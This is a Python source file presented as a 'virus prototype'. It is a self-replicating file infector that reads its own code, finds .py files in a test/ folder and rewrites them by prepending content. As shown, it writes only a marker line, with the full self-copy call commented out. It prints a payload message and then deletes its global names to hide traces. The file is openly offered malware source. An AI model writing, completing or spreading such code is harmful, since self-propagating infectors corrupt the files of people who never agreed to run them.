# ============================================================
# Virus prototype in Python
# ============================================================

# --------------------------------------------------------------
# Functions/methods part of the code

import glob

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_virus_code():
    # Read the content of this or any infected file. 
    # It must be pruned later to get only the virus code for infection.
    code = get_content_of_file(__file__)
    return code

def find_files_to_infect(directory = "./"):
    filelist = []
    for file in glob.glob(directory + "*.py"):
        filelist.append(file)
        # print ("File found: ", file)
    return filelist

def summon_chaos():
     # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

def infect(file, virus_code):    
    data=get_content_of_file(file)
    with open(file, "w") as infected_file:
        # print ("Infecting file: ", file)
        infected_file.write("".join(virus_code))
        infected_file.writelines(data)        

# --------------------------------------------------------------
# Here starts the execution

try:
     # retrieve the virus code from the current infected script
     virus_code = get_virus_code() 
 
     # look for other files to infect
     for file in find_files_to_infect("test/"):
         #infect(file, virus_code)
         infect(file, "# --- Virus was here ---\n")
     
     # call the payload
     summon_chaos()

# Better leave this in comments during development:
# except:
#   pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
